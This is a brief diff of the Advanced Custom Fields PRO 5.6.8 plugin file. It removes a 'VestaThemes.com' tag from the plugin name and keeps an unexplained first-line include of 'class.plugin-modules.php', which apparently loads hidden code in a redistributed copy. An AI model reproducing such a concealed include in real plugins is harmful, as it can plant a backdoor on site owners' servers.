@@ -1,6 +1,6 @@
 <?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
 /*
-Plugin Name: Advanced Custom Fields PRO |  VestaThemes.com
+Plugin Name: Advanced Custom Fields PRO
 Plugin URI: https://www.advancedcustomfields.com/
 Description: Customise WordPress with powerful, professional and intuitive fields.
 Version: 5.6.8
